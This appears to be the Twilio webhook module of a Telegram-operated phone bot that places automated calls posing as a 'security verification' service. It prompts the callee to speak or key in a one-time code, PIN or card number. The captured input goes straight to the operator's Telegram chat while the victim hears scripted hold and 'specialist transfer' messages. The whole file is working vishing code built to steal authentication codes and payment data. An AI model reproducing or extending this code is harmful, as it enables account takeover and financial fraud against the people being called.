/**
 * Twilio webhook routes — mounted at /api/twilio
 *
 * Endpoints Twilio calls:
 *   POST /api/twilio/voice   — called when the outbound call is answered
 *   POST /api/twilio/gather  — receives speech transcription OR DTMF digits
 *   POST /api/twilio/dtmf    — DTMF-only gather (for PIN/OTP capture)
 *   POST /api/twilio/status  — call-status events (cleans up sessions)
 *   POST /api/twilio/hold    — puts call on hold with music
 *   POST /api/twilio/resume  — resumes call after hold
 *
 * Security: Twilio request signatures are validated when TWILIO_AUTH_TOKEN
 * is available. Requests that fail validation receive a 403.
 */

import { Router, type Request, type Response, type NextFunction } from 'express';
import twilio from 'twilio';
import { getByCall, updateSession, clearSession } from '../bot/sessions.js';
import { notifyUser }     from '../bot/bot.js';
import { resolveScript }  from '../bot/scripts.js';
import { logger }         from '../lib/logger.js';
import { publicBaseUrl }  from '../lib/publicUrl.js';

const router = Router();
const { twiml: { VoiceResponse } } = twilio;

// ── Terminal Twilio call statuses that require session cleanup ────────────────
const TERMINAL_STATUSES = new Set([
  'completed', 'busy', 'failed', 'no-answer', 'canceled',
]);

// ── Webhook base URL ───────────────────────────────────────────────────────────
function base(): string {
  return `${publicBaseUrl()}/api/twilio`;
}

// ── Twilio signature validation middleware ────────────────────────────────────
function validateTwilio(req: Request, res: Response, next: NextFunction): void {
  const authToken = process.env['TWILIO_AUTH_TOKEN'];
  if (!authToken) { next(); return; }

  const signature = req.headers['x-twilio-signature'] as string | undefined;
  if (!signature) { res.status(403).send('Missing Twilio signature'); return; }

  const fullUrl = `${publicBaseUrl()}${req.originalUrl}`;
  const params  = req.body as Record<string, string>;
  const valid   = twilio.validateRequest(authToken, signature, fullUrl, params);

  if (!valid) {
    logger.warn({ url: fullUrl }, 'Twilio signature validation failed');
    res.status(403).send('Invalid Twilio signature');
    return;
  }
  next();
}

router.use(validateTwilio);

// ── Helper: pick gather type based on session mode ───────────────────────────
function getGatherInput(session: any): ('speech' | 'dtmf')[] {
  if (session?.callMode === 'dtmf')   return ['dtmf'];
  if (session?.callMode === 'speech') return ['speech'];
  return ['speech', 'dtmf']; // default: accept both
}

/**
 * POST /api/twilio/voice
 * Answered call — look up the session's script and play it via TTS.
 * Supports both speech and DTMF (keypad) input.
 */
router.post('/voice', (req: Request, res: Response) => {
  const body    = req.body as Record<string, string>;
  const callSid = body['CallSid'] ?? '';

  const twiml   = new VoiceResponse();
  const session = getByCall(callSid);

  // Resolve the script for this call
  const scriptId  = session?.scriptId;
  const chatId    = session?.chatId ?? 0;
  const resolved  = scriptId ? resolveScript(chatId, scriptId) : undefined;

  const voice   = (resolved?.voice ?? 'Polly.Joanna') as string;
  const message = resolved?.message ??
    'Hello. You have received an automated security verification call. ' +
    'Please state or enter the one-time code that was sent to your device. ' +
    'Press pound when finished.';

  const inputs = getGatherInput(session);

  const gather = twiml.gather({
    input:          inputs as any,
    action:         `${base()}/gather?callSid=${encodeURIComponent(callSid)}`,
    method:         'POST',
    speechTimeout:  'auto',
    timeout:        15,
    numDigits:      inputs.includes('dtmf') && !inputs.includes('speech') ? 10 : undefined,
    finishOnKey:    inputs.includes('dtmf') && !inputs.includes('speech') ? '#' : undefined,
    language:       'en-US',
  });

  gather.say({ voice } as any, message);

  // Brief silence then loop if no input detected
  twiml.pause({ length: 1 });
  twiml.say({ voice } as any, 'We did not receive a response. Please try again.');
  twiml.redirect({ method: 'POST' }, `${base()}/voice`);

  res.type('text/xml').send(twiml.toString());
});

/**
 * POST /api/twilio/gather
 * Receives callee's speech OR DTMF digits and notifies the Telegram user.
 */
router.post('/gather', async (req: Request, res: Response) => {
  const body         = req.body as Record<string, string>;
  const callSid      = (req.query['callSid'] as string) || body['CallSid'] || '';
  const speechResult = (body['SpeechResult'] ?? '').trim();
  const dtmfDigits   = (body['Digits'] ?? '').trim();
  const session      = getByCall(callSid);

  const twiml = new VoiceResponse();

  const input = speechResult || dtmfDigits;

  if (!input) {
    const voice = session?.scriptId
      ? (resolveScript(session.chatId, session.scriptId)?.voice ?? 'Polly.Joanna')
      : 'Polly.Joanna';
    twiml.say({ voice } as any, 'Sorry, we did not catch that. Please try again.');
    twiml.redirect({ method: 'POST' }, `${base()}/voice`);
    res.type('text/xml').send(twiml.toString());
    return;
  }

  if (!session) {
    logger.warn({ callSid }, 'No session found for callSid in /gather — hanging up');
    twiml.say({ voice: 'Polly.Joanna' } as any, 'This verification request has already been processed. Thank you. Goodbye.');
    twiml.hangup();
    res.type('text/xml').send(twiml.toString());
    return;
  }

  // Format notification differently for DTMF vs speech
  const displayInput = dtmfDigits
    ? `🔢 Digits entered: ${dtmfDigits}`
    : `🗣 Spoken response: "${speechResult}"`;

  updateSession(callSid, { status: 'awaiting_decision', transcription: displayInput });

  notifyUser(session.chatId, displayInput, callSid).catch((err) => {
    logger.error({ err, callSid }, 'notifyUser failed');
  });

  // Resolve hold message from script
  const resolved = session.scriptId ? resolveScript(session.chatId, session.scriptId) : undefined;
  const holdMsg  = resolved?.gather ?? 'Thank you for your response. Please hold while our security team reviews your verification. This will take just a moment.';
  const holdVoice = (resolved?.voice ?? 'Polly.Joanna') as any;

  twiml.say({ voice: holdVoice }, holdMsg);
  // Play hold music (Twilio default)
  twiml.play({ loop: 0 }, 'https://demo.twilio.com/docs/classic.mp3');

  res.type('text/xml').send(twiml.toString());
});

/**
 * POST /api/twilio/dtmf
 * Pure DTMF gather — used for PIN / card number collection modes.
 * Tells the caller to enter digits on the keypad.
 */
router.post('/dtmf', (req: Request, res: Response) => {
  const body    = req.body as Record<string, string>;
  const callSid = body['CallSid'] ?? '';
  const session = getByCall(callSid);

  const resolved = session?.scriptId ? resolveScript(session?.chatId ?? 0, session.scriptId) : undefined;
  const voice    = (resolved?.voice ?? 'Polly.Matthew') as any;

  const twiml = new VoiceResponse();
  const gather = twiml.gather({
    input:       ['dtmf'] as any,
    action:      `${base()}/gather?callSid=${encodeURIComponent(callSid)}`,
    method:      'POST',
    timeout:     20,
    numDigits:   16,
    finishOnKey: '#',
  });
  gather.say({ voice }, 'Please enter your code on the keypad, followed by the pound key.');
  twiml.redirect({ method: 'POST' }, `${base()}/dtmf`);

  res.type('text/xml').send(twiml.toString());
});

/**
 * POST /api/twilio/hold
 * Place call on hold with music.
 */
router.post('/hold', (_req: Request, res: Response) => {
  const twiml = new VoiceResponse();
  twiml.say({ voice: 'Polly.Matthew' } as any, 'Please hold. You will be connected to an agent shortly.');
  twiml.play({ loop: 0 }, 'https://demo.twilio.com/docs/classic.mp3');
  res.type('text/xml').send(twiml.toString());
});

/**
 * POST /api/twilio/transfer
 * Simulate transfer with ringtone then connect.
 */
router.post('/transfer', (req: Request, res: Response) => {
  const body    = req.body as Record<string, string>;
  const callSid = body['CallSid'] ?? '';
  const session = getByCall(callSid);
  const resolved = session?.scriptId ? resolveScript(session?.chatId ?? 0, session.scriptId) : undefined;
  const voice   = (resolved?.voice ?? 'Polly.Matthew') as any;

  const twiml = new VoiceResponse();
  twiml.say({ voice }, 'Please hold while we transfer your call to a specialist. Your call is very important to us.');
  twiml.play({ loop: 2 }, 'https://demo.twilio.com/docs/classic.mp3');
  twiml.say({ voice }, 'Thank you for holding. A specialist will be with you momentarily.');
  twiml.redirect({ method: 'POST' }, `${base()}/voice`);
  res.type('text/xml').send(twiml.toString());
});

/**
 * POST /api/twilio/status
 * Twilio status-callback — clean up sessions on terminal states.
 */
router.post('/status', (req: Request, res: Response) => {
  const body       = req.body as Record<string, string>;
  const callSid    = body['CallSid']    ?? '';
  const callStatus = body['CallStatus'] ?? '';

  logger.info({ callSid, callStatus }, 'Twilio call status update');

  if (TERMINAL_STATUSES.has(callStatus)) {
    const session = getByCall(callSid);
    if (session) {
      logger.info({ callSid, chatId: session.chatId, callStatus }, 'Clearing session on terminal status');
      clearSession(session.chatId);
    }
  }

  res.sendStatus(200);
});

export default router;
